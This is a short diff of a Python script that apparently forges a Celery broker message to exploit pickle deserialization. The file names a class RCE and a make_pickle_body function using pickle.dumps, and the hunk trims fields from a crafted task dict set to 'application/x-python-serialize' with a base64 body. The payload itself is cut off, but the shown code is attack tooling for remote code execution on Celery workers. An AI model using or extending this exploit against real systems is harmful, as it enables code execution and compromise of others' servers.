@@ -82,21 +82,15 @@ class RCE:
 TASK = {
     "content-type": "application/x-python-serialize",
     "properties": {
-        "delivery_tag": "16f3f59d-003c-4ef4-b1ea-6fa92dee529a",
-        "reply_to": "9edb8565-0b59-3389-944e-a0139180a048",
-        "delivery_mode": 2,
+        "delivery_tag": "",
         "body_encoding": "base64",
         "delivery_info": {
             "routing_key": "celery",
             "priority": 0,
             "exchange": "celery",
-        },
-        "correlation_id": "6e046b48-bca4-49a0-bfa7-a92847216999",
+        }
     },
-    "headers": {},
-    "content-encoding": "binary",
 }
-
 
 def make_pickle_body():
     payload = pickle.dumps(
